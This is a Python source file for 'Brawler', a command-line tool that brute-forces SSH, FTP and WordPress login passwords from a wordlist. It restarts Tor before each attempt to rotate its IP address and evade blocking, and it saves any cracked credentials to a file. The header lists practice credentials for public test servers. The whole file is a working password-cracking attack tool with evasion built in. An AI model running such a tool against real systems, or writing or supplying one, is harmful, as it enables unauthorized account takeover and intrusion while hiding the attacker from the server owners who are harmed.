# TEST CREDENTIALS

# SSH:
# https://overthewire.org/wargames/bandit/bandit0.html

# Username = bandit0
# Password = bandit0
# IP Address = bandit.labs.overthewire.org
# Port = 2220

# FTP:
# https://dlptest.com/ftp-test/

# Username = dlpuser
# Password = rNrKYTX9g7z3RgJRmxWuGHbeu
# IP Address = ftp.dlptest.com
# Port = 21

from argparse import ArgumentParser
from logging import basicConfig, DEBUG, debug, disable, CRITICAL
from sys import exit as sysexit
from ftplib import FTP, error_perm
from paramiko import SSHClient, AutoAddPolicy, ssh_exception
from subprocess import run
from time import sleep
from re import compile
from requests import Session
from io import BytesIO
from lxml import etree

# Doing the basic configuration for the debugging feature
basicConfig(level=DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Disabling the debugging feature. Comment out the line to enable debugging.
disable(CRITICAL)

# ANSI escape code for golden color (yellow)
golden_color = '\033[93m'

green_color = '\033[92m'

red_color = '\033[91m'

reset_color = '\033[0m'  # Reset color to default

# Creating a pattern for ip address validation
ip_addr_regex = compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}')

SUCCESS = 'Welcome to WordPress!'

class Brawler:

    def __init__(self, choice, username, target, port, wordlist, output):

        self.version = "Brawler 1.0.1"

        self.choice = choice

        self.username = username

        self.target = target

        self.port = port

        self.wordlist = wordlist

        self.output = output

    def crack_ftp(self):
        """A function which cracks ftp passwords"""

        print(f'{golden_color}Cracking FTP password{reset_color}\n{"-" * 30}')

        port = int(self.port)

        try:

            self.restart_tor_service()

            with open(self.wordlist, 'r') as pw:

                passwords = pw.readlines()

            print(f'{len(passwords)} passwords found.\n')

            for passwd in passwords:

                password = passwd.strip('\r\n')

                try:
                    
                    print(f'#{int(passwords.index(passwd))+1}) Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
                    # print(f'Trying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')
                    
                    ftp = FTP(timeout=10)

                    ftp.connect(self.target, port)

                    ftp.login(self.username, password)

                    print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}"}}\nOutput -> {self.output}\n')

                    with open(self.output, 'w') as credentials:

                        credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nPort = {self.port}\nType = {self.choice}')

                    ftp.quit()

                    break

                except error_perm as exc:

                    print(f'{red_color}{exc} Still trying...{reset_color}\n')

                except Exception as exx:

                    print(f'{red_color}{exx} Still trying...{reset_color}\n')

                self.restart_tor_service()

        except Exception as exc:
            print(f'Error: {red_color}{exc}{reset_color}')

    def crack_ssh(self):
        """A function which cracks SSH passwords"""

        print(f'{golden_color}Cracking SSH password{reset_color}\n{"-" * 30}')

        port = int(self.port)

        try:

            self.restart_tor_service()

            with open(self.wordlist, 'r') as pw:

                passwords = pw.readlines()

            print(f'{len(passwords)} passwords found.\n')

            for passwd in passwords:

                password = passwd.strip('\r\n')

                try:

                    print(f'#{int(passwords.index(passwd))+1}) Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}"}}')
                    # print(f'Trying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}" }}')

                    ssh = SSHClient()

                    ssh.set_missing_host_key_policy(AutoAddPolicy())
                    
                    ssh.connect(self.target, port=port, username=self.username, password=password)

                    print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}", "Port": "{self.port}"}}\nOutput -> {self.output}\n')

                    with open(self.output, 'w') as credentials:

                        credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nPort = {self.port}\nType = {self.choice}')

                    ssh.close()

                    break
                
                except Exception as exc:

                    print(f'{red_color}{exc} Still trying...{reset_color}\n')

                self.restart_tor_service()

        except Exception as exc:
            print(f'Error: {red_color}{exc}{reset_color}')

    def crack_wp(self):
        """A function which cracks wp passwords"""

        print(f'{golden_color}Cracking WP password{reset_color}\n{"-" * 30}')

        try:

            self.restart_tor_service()

            with open(self.wordlist, 'r') as pw:

                passwords = pw.readlines()

            print(f'{len(passwords)} passwords found.\n')

            for passwd in passwords:

                password = passwd.strip('\r\n')
                
                try:

                    attempt = self.wp_login_attempt(passwords=passwords, passwd=passwd, password=password)

                    debug(attempt)

                    if SUCCESS in attempt:

                        print(f'\n{green_color}Success!{reset_color}\n{"-" * 30}\n{{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}"\nOutput -> {self.output}\n')

                        with open(self.output, 'w') as credentials:

                            credentials.write(f'Username = {self.username}\nPassword = {password}\nTarget= {self.target}\nType = {self.choice}')

                        break

                    else:

                        print(f'{red_color}Login Failed. Still trying...{reset_color}\n')

                except Exception as exc:

                    print(f'{red_color}{exc} Still trying...{reset_color}\n')

                # self.restart_tor_service()

        except Exception as exc:

            print(f'Error: {red_color}{exc}{reset_color}')

    def wp_login_attempt(self, passwords, passwd, password):
        """A function which tries to send a successfull post request to WordPress login page"""

        while True:

            try:

                print(f'#{int(passwords.index(passwd))+1}) Your IP address = {self.get_public_ip_addr()}\nTrying => {{"Username": "{self.username}", "Password": "{password}", "Target": "{self.target}"')
                
                session = Session()

                resp0 = session.get(self.target)

                params = self.get_params(resp0.content)

                params['log'] = self.username

                params['pwd'] = password

                resp1 = session.post(self.target, data=params)

                resp1_status = int(resp1.status_code)

                debug(f'Response Status Code = {resp1_status}')

                if resp1_status != 403:

                    return resp1.content.decode()

                    break

                else:

                    self.restart_tor_service()

            except Exception as err:

                print(f'{red_color}{err} Still trying...{reset_color}\n')

                self.restart_tor_service()

    def get_params(self, content):
        """A function which creates a params dictionary to brute force WordPress HTML forms"""

        params = dict()

        parser = etree.HTMLParser()
        
        tree = etree.parse(BytesIO(content), parser=parser)
        
        for elem in tree.findall('//input'):
        
            name = elem.get('name')
        
            if name is not None:
        
                params[name] = elem.get('value', None)

        return params

    def get_public_ip_addr(self):
        """A function which gets user's public IP address"""
        
        while True:
            
            try:
        
                public_ip_address = run(["bash", "-c", "curl --connect-timeout 14.15 {}".format("https://ifconfig.io")], text=True, capture_output=True).stdout.strip()

                result = ip_addr_regex.search(public_ip_address).group()

                # Checking if pattern validation's result is equal to the get request's response
                if result == public_ip_address:

                    break

                # Checking if the pattern validation's result is not equal to the get request's response
                else:
                    
                    # Restart the Tor service before each attempt
                    self.restart_tor_service()

            except:
                
                # Restart the Tor service before each attempt
                self.restart_tor_service()

        return public_ip_address

    def restart_tor_service(self):
        """A function which restarts the tor service"""

        while True:

            try:
                
                # Restart the Tor service before each attempt
                run(["bash", "-c", "systemctl restart tor"], text=True, capture_output=True)

                sleep(2)

                # Checking tor service's status
                is_tor_active = run(["bash", "-c", "systemctl is-active tor.service"], text=True, capture_output=True).stdout.strip()

                debug(f'Tor Status = {is_tor_active}')

                # Checking if the tor service is inactive
                if "active" == is_tor_active:
                    
                    break

                # Checking if the tor service is active
                else:
                    
                    print('There is a problem with starting tor service.')

                    continue

            except Exception as err:

                print(f'Error: {err}')

    def display_version(self):
        """A function which displays the app's version"""

        print(self.version)

def main():
    """The function which runs the entire application"""

    # Create an argument parser
    parser = ArgumentParser(description="A command line tool to brute force common web servers and applications.")

    # Add arguments
    parser.add_argument('-v', '--version', action="store_true", help="Display the application's version information",)

    parser.add_argument('choice', choices=['ssh', 'ftp', 'wp'], nargs="?", help="Choice of platform (ssh, ftp, wp)")

    parser.add_argument('-u', '--username', help="User's username who is authorized in the server")

    parser.add_argument('-t', '--target', help="Target specification")

    parser.add_argument('-p', '--port', help="Port specification")

    parser.add_argument("source_path", nargs="?", help="Source path of your word list")
    
    parser.add_argument("destination_path", nargs="?", help="Destination path of your word list")

    # Parse the arguments
    args = parser.parse_args()

    if args.version:

        app = Brawler(choice=None, username=None, target=None, port=None, wordlist=None, output=None)
    
        app.display_version()

    elif args.choice and args.username and args.target and args.port and args.source_path and args.destination_path:

        if args.choice == "ssh":
            
            app = Brawler(choice=args.choice, username=args.username, target=args.target, port=args.port, wordlist=args.source_path, output=args.destination_path)

            app.crack_ssh()

        elif args.choice == "ftp":

            app = Brawler(choice=args.choice, username=args.username, target=args.target, port=args.port, wordlist=args.source_path, output=args.destination_path)

            app.crack_ftp()

        else:

            print("Invalid choice. Use -h or --help to get more information.")


    elif args.choice and args.username and args.target and args.source_path and args.destination_path:
        
        if args.choice == "wp":
            
            app = Brawler(choice=args.choice, username=args.username, target=args.target, port=None, wordlist=args.source_path, output=args.destination_path)

            app.crack_wp()
    
        else:

            print("Invalid choice. Use -h or --help to get more information.")

    else: 

        print("Invalid usage. Use -h or --help to get more information.") 

# Evaluate if the source is being run on its own or being imported somewhere else. With this conditional in place, your code can not be imported somewhere else.
if __name__ == '__main__':

    main()